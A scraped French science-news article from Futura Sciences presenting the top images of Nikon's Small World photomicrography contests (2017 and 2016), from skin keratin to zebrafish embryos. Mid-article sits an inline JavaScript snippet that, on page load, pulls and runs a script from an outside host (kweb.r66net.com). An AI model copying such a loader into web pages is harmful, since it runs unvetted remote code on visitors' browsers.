{"title": "Photomicrographie : les 5 plus belles images de sciences", "newspaper": "Futura Sciences", "author": ["Nathalie Mayer"], "date_publi": "2016-10-26", "content": "Cette annee encore, Nikon, le fabricant japonais d'appareils photo, organisait un concours destine a celebrer la beaute et la complexite de la nature telle que peuvent nous les reveler des images prises au microscope. Et le premier prix 2017 offre une vision exceptionnelle d'un objet que nous voyons pourtant tous les jours : notre peau. Depuis 1975, le fabricant japonais d'appareils photo Nikon propose aux amoureux de science et de jolies choses de montrer la beaute des sujets qu'ils etudient en participant au concours  Small World . Cette annee encore, plus de 2.000 photos provenant de pres de 90 pays etaient en competition. Et la photo laureate de l'edition 2017 revele une nature sublime et un peu effrayante... Toutes les  photomicrographies recompensees par le jury  sont visibles en ligne.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les secrets de la peau humaine C'est pour une photo prise au  microscope  d'un echantillon de  peau humaine  qu'une equipe de chercheurs du  Netherlands Cancer Institute  (Pays-Bas) s'est vue attribuer le premier prix du concours  Small World  2017. Sur cette photo, on observe plus particulierement une cellule de peau presentant une quantite excessive de keratine (en jaune). L'etude de la structure, de la dynamique et de la regulation des reseaux de keratine -- un  marqueur tumoral  couramment employe -- devrait permettre d'en apprendre plus sur le developpement des cancers. Une cellule de peau humaine et ses filaments de keratine grossis 40 fois. (c) Bram van den Broek,  The Netherlands Cancer Institute                               Une mauvaise herbe a l'honneur de  Small World  2017 Le senecon commun ou  Senecio vulgaris  est une plante extremement repandue dans nos jardins ou elle s'invite plus qu'elle n'est cultivee. Ses fruits sont des akenes plumeux et volants comme ceux des  pissenlits . Et c'est justement grace a une superbe photo de ses graines qu'un scientifique israelien, Havy Sarfaty, a decroche le deuxieme prix du concours Small World 2017. Gros plan sur les fruits et les graines d'un senecon commun, grossis 2 fois. (c) Havy Sarfaty,  Eyecare Clinic                               Une algue verte hors du commun C'est a une photo prise d'une  algue verte  d'eau douce du genre  Volvox , que le francais Jean-Marc Babalian doit sa troisieme place au concours  Small World  2017. Les  Volvox  interessent les chercheurs car ils constituent un exemple d'algues a la frontiere entre l'unicellulaire et le pluricellulaire. Leurs cellules somatiques, en effet, sont rassemblees mais non differenciees. Et l'on parle plus volontiers de colonie que d'organisme. Une algue du genre  Volvox  liberant des colonies filles, le tout grossi 100 fois. (c) Jean-Marc Babalian                               La tete d'un tenia s'affiche au  Small World  2017 Vous vous etes toujours demande a quoi ressemblait la tete d'un tenia ? Vous avez desormais la reponse et elle vaut la quatrieme place du concours  Small World  2017 a Teresa Zgoda du  Rochester Institute of Technology  (Etats-Unis). Sachez toutefois que ce tenia arme ou  Taenia solium  -- un  vers intestinal  qui ne provoque generalement pas de symptomes ou alors des  troubles digestifs  benins -- a presque disparu des pays industrialises tant il est facile a deceler. Le scolex -- la tete -- evase d'un tenia. (c) Teresa Zgoda,  Rochester Institute of Technology                               Une tomate moisie La cinquieme place du concours  Small World  2017 revient a l'Israelien Dean Lerman pour une photo de  moisissure  a la surface d'une tomate. Apres cela, vous ne verrez peut-etre plus du meme oeil, ces petites excroissances cotonneuses qui ont la facheuse tendance a fleurir sur vos aliments. De la moisissure sur une tomate, grossie 3,9 fois. (c) Dean Lerman                               Pour en savoir plus La photomicrographie en 5 images stupefiantes Article de Nathalie Mayer paru le 26/10/2016 Chaque annee depuis 1975, Nikon, le fabricant japonais d'appareils photo organise un concours destine a celebrer la beaute et la complexite de la nature telle que peuvent nous les reveler des images prises au microscope. En 2016, c'est la photo incroyable d'un  embryon  de  poisson  qui remporte le premier prix. Une  photomicrographie  constitue avant tout un document de travail dont la valeur se juge a son interet scientifique et/ou technique. Mais pour les participants au concours  Small World , organise chaque annee par le fabricant japonais d'appareils photo Nikon, une photomicrographie doit aussi savoir montrer la beaute du sujet etudie. Et c'est bien a ces deux criteres que repond le grand gagnant de l'edition 2016. Toutes les  photomicrographies recompensees par le jury  cette annee sont visibles en ligne. Un embryon de poisson-zebre C'est a Oscar Ruiz, un geneticien de l'universite du Texas, que le jury a choisi d'attribuer le premier prix du concours  Small World  2016. Il est parvenu a photographier au  microscope confocal , et de face s'il vous plait, un  embryon de poisson-zebre  age de seulement 4 jours. Oscar Ruiz etudie le developpement facial au niveau cellulaire dans le but de mieux comprendre le role du tissu epithelial dans l'apparition de maladies humaines. Il s'appuie sur le modele du poisson et sur les  mutations genetiques  qui peuvent intervenir au cours des premiers stades de son developpement embryonnaire et leurs liens avec des malformations du visage. Un embryon de poisson-zebre age d'a peine 4 jours et grossi 10 fois. (c) Oscar Ruiz,  University of Texas                               La patte du scarabee plongeur Avec une photo prise au microscope confocal et grossie 100 fois d'une patte avant d'un  scarabee plongeur , Igor Siwanowicz decroche la cinquieme place du concours. Le scarabee plongeur mesure jusqu'a 35 millimetres de long. Comme son nom l'indique, il a pour habitude de plonger, le plus souvent dans les mares et les etangs a vegetation abondante, pour y trouver de la nourriture ( tetards ,  alevins ,  larves  et autres petits poissons). En laboratoire, il sert a etudier la production d' enzymes  proteolytiques lors de la  digestion  ainsi que le  systeme nerveux  des  insectes . Les ventouses qui ornent les pattes anterieures du scarabee plongeur apparaissent nettement sur cette photo. (c) Igor Siwanowicz,  Howard Hughes Medical Institute                       Des bulles de vitamine C Cette etonnante photo prise en microscopie en  lumiere  polarisee et grossie 50 fois represente des bulles d' air  formees par des cristaux de vitamines C fondus. Elle vaut a Marek Mis, la sixieme place du concours Small World. La  vitamine C  joue un role fondamental dans le  metabolisme  de l'etre humain. Elle est sensible a la  chaleur  et a la lumiere. Et les cristaux de  vitamine C  presentent des proprietes birefringentes a l'origine des jolies  couleurs  qui apparaissent sur cette photo. Sur cette photo, des bulles d'air formees par des cristaux de vitamine C. (c) Marek Mis Photography                               Du caoutchouc et du verre Cette photo prise en microscopie en champ clair et grossie 20 fois est l'oeuvre de James Hedrick, chimiste a l'universite de Northwestern. Elle a ete distinguee par le jury du concours Nikon. Elle figure un  caoutchouc  -- le polydimethylsiloxane, encore connu sous la designation de PDMS -- recouvert d'un mince film de verre. En refroidissant, le  caoutchouc  se contracte et entraine des deformations du  verre . Quand le caoutchouc se melange au verre. (c) James Hedrick,  Northwestern University                               La bouse de vache Avec cette photo prise en microscopie en champ sombre et grossie 30 fois, Michael Crutchley reussit la prouesse de rendre attrayante... une  bouse de vache  ! Il se place ainsi en vingtieme position du concours. Et sachez que la bouse est d'un grand interet pour les entomologistes. Car, composee d'eau et de nombreuses  matieres  organiques, elle attire des insectes  coprophages . De la bouse de vache comme vous n'en avez jamais vu. (c) Michael Crutchley                               Un moustique qui pique vu au microscope                       Sur cette video, on peut observer comment un moustique fait bouger sa trompe (ou proboscis, en marron) a la recherche d'un vaisseau sanguin dans la peau d'une souris anesthesiee. Contrairement a une seringue, celle-ci n'est pas rigide mais bel et bien souple. Il finit enfin par trouver son bonheur autour de la 20e seconde et commence a aspirer le sang qui passe a sa portee. (c) Choumet et al., Plos One, 2012                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  belles formules  |  plus belles piscines  |  plus belles villes du monde", "theme": "planete"}